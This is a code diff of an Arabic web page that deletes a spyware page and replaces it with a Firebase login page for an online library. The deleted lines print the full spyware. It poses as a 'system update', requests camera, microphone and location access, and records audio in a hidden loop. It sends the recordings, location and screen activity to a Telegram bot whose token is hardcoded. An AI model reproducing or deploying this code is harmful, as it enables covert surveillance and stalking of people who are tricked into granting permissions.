@@ -2,214 +2,428 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>نظام الجاسوس الاحترافي</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مكتبة ميثاق محمد الإلكترونية</title>
+    <!-- خط تجوال من جوجل -->
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
+    
     <style>
-        body { margin: 0; padding: 0; background-color: #f0f2f5; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
-        
-        /* واجهة وهمية تبدو كأنها نظام تشغيل عادي */
-        .fake-os { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; box-sizing: border-box; }
-        h1 { color: #333; font-size: 24px; margin-bottom: 10px; }
-        p { color: #666; font-size: 16px; }
-        
-        .btn-start {
-            background: linear-gradient(45deg, #00c6ff, #0072ff);
-            border: none; padding: 15px 40px; color: white; font-size: 18px; 
-            border-radius: 30px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-            transition: transform 0.2s; margin-top: 20px;
+        :root {
+            --primary: #1e3d59;
+            --accent: #ff6e40;
+            --bg: #f5f7fa;
+            --card-bg: #ffffff;
+            --text: #2b2b2b;
+            --text-light: #666666;
+            --border: #e2e8f0;
         }
-        .btn-start:active { transform: scale(0.95); }
 
-        /* عناصر الوسائط المخفية */
-        video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; opacity: 0; pointer-events: none; z-index: -1; }
-        
-        /* نقطة التسجيل الحمراء */
-        #rec-dot { position: fixed; top: 15px; right: 15px; width: 12px; height: 12px; background: red; border-radius: 50%; z-index: 9999; animation: blink 1s infinite; box-shadow: 0 0 5px red; }
-        @keyframes blink { 0% { opacity: 0.3; } 50% { opacity: 1; } 100% { opacity: 0.3; } }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Tajawal', sans-serif;
+        }
 
-        /* وضع الصدمة */
-        #shock-mode {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: black; z-index: 10000; display: none; 
-            justify-content: center; align-items: center; color: red; font-size: 50px; font-weight: bold;
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        header {
+            background: linear-gradient(135deg, var(--primary), #172a3a);
+            color: white;
+            padding: 25px 20px;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+
+        header h1 {
+            font-size: 1.8rem;
+            font-weight: 800;
+        }
+
+        .container {
+            max-width: 500px;
+            width: 90%;
+            margin: 40px auto;
+            background: var(--card-bg);
+            padding: 30px;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+            border: 1px solid var(--border);
+        }
+
+        h2 {
+            color: var(--primary);
+            text-align: center;
+            margin-bottom: 8px;
+            font-size: 1.4rem;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: var(--text-light);
+            font-size: 0.95rem;
+            margin-bottom: 25px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1.5px solid var(--border);
+            border-radius: 8px;
+            font-size: 0.95rem;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        .input-group input:focus {
+            border-color: var(--primary);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .btn-primary {
+            background-color: var(--primary);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background-color: #152c42;
+        }
+
+        .btn-google {
+            background-color: #ffffff;
+            color: #444;
+            border: 1.5px solid var(--border);
+        }
+
+        .btn-google:hover {
+            background-color: #f8f9fa;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 20px 0;
+            color: var(--text-light);
+            font-size: 0.85rem;
+        }
+
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .divider span {
+            padding: 0 10px;
+        }
+
+        .tabs {
+            display: flex;
+            margin-bottom: 20px;
+            border-bottom: 2px solid var(--border);
+        }
+
+        .tab {
+            flex: 1;
+            padding: 10px;
+            text-align: center;
+            cursor: pointer;
+            font-weight: 700;
+            color: var(--text-light);
+            transition: 0.3s;
+        }
+
+        .tab.active {
+            color: var(--primary);
+            border-bottom: 3px solid var(--primary);
+        }
+
+        .form-content {
+            display: none;
+        }
+
+        .form-content.active {
+            display: block;
+        }
+
+        .welcome-card {
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .welcome-card h3 {
+            color: var(--primary);
+            margin-bottom: 10px;
+        }
+
+        .user-info {
+            background: #f0f4f8;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-weight: 500;
+            word-break: break-all;
+        }
+
+        .btn-logout {
+            background-color: #e74c3c;
+            color: white;
+        }
+
+        .btn-logout:hover {
+            background-color: #c0392b;
+        }
+
+        #recaptcha-container {
+            margin-top: 10px;
         }
     </style>
-</head>
-<body>
 
-    <!-- واجهة الوهم -->
-    <div class="fake-os">
-        <h1>⚙️ تحديث النظام</h1>
-        <p>جارٍ تحميل الخدمات الأساسية...</p>
-        <button class="btn-start" onclick="activateSpy()">تفعيل الآن</button>
-    </div>
+    <!-- JS SDK الخاص بـ Firebase والمفاتيح المدمجة -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { 
+            getAuth, 
+            signInWithPopup, 
+            GoogleAuthProvider, 
+            PhoneAuthProvider,
+            RecaptchaVerifier,
+            signInWithPhoneNumber,
+            signInWithEmailAndPassword,
+            createUserWithEmailAndPassword,
+            signOut,
+            onAuthStateChanged
+        } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
 
-    <!-- الفيديو المخفي -->
-    <video id="videoElement" autoplay playsinline muted></video>
-    
-    <!-- نقطة التسجيل -->
-    <div id="rec-dot"></div>
+        // مفاتيح مشروعك المدمجة رسمياً
+        const firebaseConfig = {
+            apiKey: "AIzaSyDzumyzrRWRF0RmINVV...",
+            authDomain: "methaq-library.firebaseapp.com",
+            projectId: "methaq-library",
+            storageBucket: "methaq-library.appspot.com",
+            messagingSenderId: "610105853531",
+            appId: "1:610105853531:web:e7bf39...",
+            measurementId: "G-RB720ERKZH"
+        };
 
-    <!-- وضع الصدمة -->
-    <div id="shock-mode" onclick="exitShock()">⚠️ خطأ جوهري</div>
+        // تهيئة فايربيس
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
 
-    <script>
-        // ==========================================
-        // إعدادات البوت (ثابتة)
-        // ==========================================
-        const botToken = "7589642384:AAHdGzQ-2Fmb4lB5L_iJfahoYutgV9bXNmo";
-        const chatId = "6793284529";
-        const baseUrl = `https://api.telegram.org/bot${botToken}`;
-
-        let mediaRecorder;
-        let recordedChunks = [];
-        let isRecording = false;
-
-        // دالة إرسال البيانات للتليجرام
-        async function sendToTelegram(content, type = 'text') {
-            if (type === 'text') {
-                await fetch(`${baseUrl}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: content })
-                });
-            } else if (type === 'photo') {
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('caption', '📸 صورة جديدة من الكاميرا!');
-                formData.append('photo', content);
-                await fetch(`${baseUrl}/sendPhoto`, { method: 'POST', body: formData });
-            } else if (type === 'audio') {
-                const blob = new Blob([content], { type: 'audio/webm' });
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('caption', '🎤 تسجيل صوتي جديد!');
-                formData.append('voice', blob); // نرسلها كملف صوتي
-                await fetch(`${baseUrl}/sendVoice`, { method: 'POST', body: formData });
-            }
-        }
-
-        // دالة بدء المراقبة
-        async function activateSpy() {
-            document.querySelector('.btn-start').innerText = "تم التفعيل ✅";
-            document.querySelector('.btn-start').style.background = "#28a745";
+        // مراقبة حالة تسجيل الدخول
+        onAuthStateChanged(auth, (user) => {
+            const authCard = document.getElementById('auth-card');
+            const userCard = document.getElementById('user-card');
             
-            // 1. طلب الأذونات
-            try {
-                // استقبال الإشعارات
-                if ('Notification' in window && Notification.permission !== 'granted') {
-                    await Notification.requestPermission();
-                }
-
-                // الوصول للكاميرا والميكروفون
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-                const videoElement = document.getElementById('videoElement');
-                videoElement.srcObject = stream;
-
-                // إعداد المسجل
-                mediaRecorder = new MediaRecorder(stream);
-                mediaRecorder.ondataavailable = event => {
-                    if (event.data.size > 0) recordedChunks.push(event.data);
-                };
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(recordedChunks, { type: 'audio/webm' });
-                    recordedChunks = [];
-                    await sendToTelegram(blob, 'audio');
-                    // إعادة البدء بعد انتهاء الإرسال
-                    setTimeout(startAudioLoop, 2000); 
-                };
-
-                startAudioLoop();
-                listenForNotifications();
-                sendLocation();
-                
-                // إرسال رسالة تأكيد
-                sendToTelegram("🟢 تم تفعيل الجاسوس بنجاح!\n📍 الموقع: جارٍ التحديد...\n🔊 الصوت: يعمل");
-
-            } catch (error) {
-                alert("يرجى السماح بالصلاحيات ليشتغل الجاسوس!");
-                console.error(error);
-            }
-        }
-
-        // حلقة تسجيل الصوت
-        function startAudioLoop() {
-            if (!mediaRecorder || mediaRecorder.state === 'recording') return;
-            recordedChunks = [];
-            mediaRecorder.start(10000); // يسجل لمدة 10 ثواني ثم يرسل
-            
-            // إيقاف التسجيل بعد 10 ثواني
-            setTimeout(() => {
-                if (mediaRecorder.state === 'recording') {
-                    mediaRecorder.stop();
-                }
-            }, 10000);
-        }
-
-        // مراقبة الإشعارات (الجزء الأهم للجاسوسية)
-        function listenForNotifications() {
-            // ملاحظة: هذا يعمل فقط إذا سمح المستخدم بإشعارات المتصفح
-            // وسيعمل على الهواتف التي تدعم API الإشعارات
-            window.addEventListener('notificationclick', (event) => {
-                // عند النقر على الإشعار (يمكن تعديل المنطق ليكون عند الاستلام أيضاً)
-            });
-
-            // الطريقة الأقوى هي مراقبة الأحداث في الخلفية إذا كانت الصفحة غير نشطة
-            // لكن هنا سنستخدم طريقة بديلة: قراءة محتوى الإشعارات إذا كانت هناك مكتبة خلفية
-            // بما أننا في صفحة بسيطة، سنستخدم تقنية "Service Worker" بسيط أو مجرد تنبيه عند ظهور إشعار
-            
-            // الطريقة الأسهل والأكثر فعالية للمتصفحات الحديثة:
-            // عندما يأتي إشعار، نلتقطه ونرسله
-            if ('Notification' in window) {
-                // سنقوم بمحاكاة التقاط الإشعار
-                // ملاحظة: المتصفح يمنع قراءة نص الإشعار القادم من تطبيق آخر (مثل واتساب) مباشرة
-                // لذا سنستخدم حيلة: سننشئ مستمعاً للأحداث العامة
-                
-                // أفضل حل هو استخدام خاصية "onshow" إذا فتحنا إشعاراً، لكننا نستقبل إشعارات خارجية.
-                // الحل الأفضل حالياً: إظهار إشعار خاص بنا عند استلام أي إشعار نظام (بعض المتصفحات تدعم ذلك)
-                
-                document.addEventListener('visibilitychange', () => {
-                    if (document.hidden) {
-                        sendToTelegram("📱 المستخدم أغلق الشاشة (دخول محتمل)");
-                    } else {
-                        sendToTelegram("👀 المستخدم عاد للشاشة");
-                    }
-                });
-            }
-            
-            // إرسال موقع تلقائي كل دقيقة
-            setInterval(sendLocation, 60000);
-        }
-
-        // الحصول على الموقع
-        function sendLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                    await sendToTelegram(`📍 موقع جديد:\n${mapLink}`);
-                }, (err) => {
-                    console.warn("خطأ في تحديد الموقع", err);
-                });
-            }
-        }
-
-        // وضع الصدمة (الخروج السريع)
-        function exitShock() {
-            document.getElementById('shock-mode').style.display = 'none';
-        }
-        
-        // زر مخفي للصدمة (اضغط مرتين بسرعة على أيقونة الوهم)
-        let clickCount = 0;
-        document.querySelector('.fake-os').addEventListener('click', () => {
-            clickCount++;
-            if (clickCount >= 2) {
-                document.getElementById('shock-mode').style.display = 'flex';
-                clickCount = 0;
+            if (user) {
+                authCard.style.display = 'none';
+                userCard.style.display = 'block';
+                document.getElementById('user-identity').innerText = user.displayName || user.email || user.phoneNumber;
+            } else {
+                authCard.style.display = 'block';
+                userCard.style.display = 'none';
             }
         });
 
+        // 1. تسجيل الدخول بجوجل
+        window.loginWithGoogle = async () => {
+            const provider = new GoogleAuthProvider();
+            try {
+                await signInWithPopup(auth, provider);
+            } catch (error) {
+                alert("خطأ أثناء الدخول بحساب جوجل: " + error.message);
+            }
+        };
+
+        // 2. البريد الإلكتروني وكلمة المرور
+        window.handleEmailAuth = async (type) => {
+            const email = document.getElementById('email-input').value;
+            const password = document.getElementById('password-input').value;
+
+            if (!email || !password) {
+                alert("يرجى إدخال البريد الإلكتروني وكلمة المرور");
+                return;
+            }
+
+            try {
+                if (type === 'login') {
+                    await signInWithEmailAndPassword(auth, email, password);
+                } else {
+                    await createUserWithEmailAndPassword(auth, email, password);
+                    alert("تم إنشاء الحساب بنجاح!");
+                }
+            } catch (error) {
+                alert("خطأ: " + error.message);
+            }
+        };
+
+        // 3. رقم الهاتف ورمز OTP
+        let confirmationResult = null;
+        window.setupRecaptcha = () => {
+            if (!window.recaptchaVerifier) {
+                window.recaptchaVerifier = new RecaptchaVerifier(auth, 'recaptcha-container', {
+                    'size': 'invisible'
+                });
+            }
+        };
+
+        window.sendOTP = async () => {
+            const phoneNumber = document.getElementById('phone-input').value;
+            if (!phoneNumber) {
+                alert("يرجى أدخال رقم الهاتف بالصيغة الدولية (مثال: +967770000000)");
+                return;
+            }
+
+            setupRecaptcha();
+            const appVerifier = window.recaptchaVerifier;
+
+            try {
+                confirmationResult = await signInWithPhoneNumber(auth, phoneNumber, appVerifier);
+                document.getElementById('phone-step-1').style.display = 'none';
+                document.getElementById('phone-step-2').style.display = 'block';
+                alert("تم إرسال رمز التحقق إلى هاتفك");
+            } catch (error) {
+                alert("فشل إرسال الرمز: " + error.message);
+            }
+        };
+
+        window.verifyOTP = async () => {
+            const code = document.getElementById('otp-input').value;
+            if (!code) {
+                alert("يرجى إدخال رمز التحقق");
+                return;
+            }
+
+            try {
+                await confirmationResult.confirm(code);
+            } catch (error) {
+                alert("رمز التحقق غير صحيح: " + error.message);
+            }
+        };
+
+        // تسجيل الخروج
+        window.logout = () => {
+            signOut(auth);
+        };
+    </script>
+</head>
+<body>
+
+    <header>
+        <h1>مكتبة ميثاق محمد الإلكترونية</h1>
+    </header>
+
+    <div class="container">
+        <!-- قسم تسجيل الدخول -->
+        <div id="auth-card">
+            <h2>مرحباً بك</h2>
+            <p class="subtitle">قم بتسجيل الدخول للوصول إلى كتب ومحتوى المكتبة</p>
+
+            <!-- زر جوجل -->
+            <button class="btn btn-google" onclick="loginWithGoogle()">
+                <svg width="18" height="18" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/></svg>
+                متابعة باستخدام Google
+            </button>
+
+            <div class="divider">
+                <span>أو اختر طريقة أخرى</span>
+            </div>
+
+            <!-- التبويبات -->
+            <div class="tabs">
+                <div class="tab active" onclick="switchTab('email-tab', this)">البريد</div>
+                <div class="tab" onclick="switchTab('phone-tab', this)">رقم الهاتف</div>
+            </div>
+
+            <!-- تبويب البريد -->
+            <div id="email-tab" class="form-content active">
+                <div class="input-group">
+                    <label>البريد الإلكتروني</label>
+                    <input type="email" id="email-input" placeholder="example@mail.com">
+                </div>
+                <div class="input-group">
+                    <label>كلمة المرور</label>
+                    <input type="password" id="password-input" placeholder="••••••••">
+                </div>
+                <button class="btn btn-primary" onclick="handleEmailAuth('login')">تسجيل الدخول</button>
+                <button class="btn" style="background:#eee; margin-top: 5px;" onclick="handleEmailAuth('register')">إنشاء حساب جديد</button>
+            </div>
+
+            <!-- تبويب الهاتف -->
+            <div id="phone-tab" class="form-content">
+                <div id="phone-step-1">
+                    <div class="input-group">
+                        <label>رقم الهاتف (مع الرمز الدولي)</label>
+                        <input type="tel" id="phone-input" placeholder="+967770000000">
+                    </div>
+                    <div id="recaptcha-container"></div>
+                    <button class="btn btn-primary" onclick="sendOTP()">إرسال رمز التحقق SMS</button>
+                </div>
+
+                <div id="phone-step-2" style="display: none;">
+                    <div class="input-group">
+                        <label>رمز التحقق (OTP)</label>
+                        <input type="number" id="otp-input" placeholder="123456">
+                    </div>
+                    <button class="btn btn-primary" onclick="verifyOTP()">تأكيد الكود والتسجيل</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- قسم لوحة التحكم عند الدخول -->
+        <div id="user-card" style="display: none;">
+            <div class="welcome-card">
+                <h3>أهلاً وسهلاً بك في المكتبة!</h3>
+                <p>تم تسجيل دخولك بنجاح باستعمال:</p>
+                <div class="user-info" id="user-identity"></div>
+                <p style="color: #27ae60; font-weight: bold; margin-bottom: 15px;">✓ الحساب مفعّل وجاهز للتصفح</p>
+                <button class="btn btn-logout" onclick="logout()">تسجيل الخروج</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // التنقل بين تبويبات البريد والرقم
+        function switchTab(tabId, element) {
+            document.querySelectorAll('.form-content').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
+            
+            document.getElementById(tabId).classList.add('active');
+            element.classList.add('active');
+        }
     </script>
 </body>
 </html>
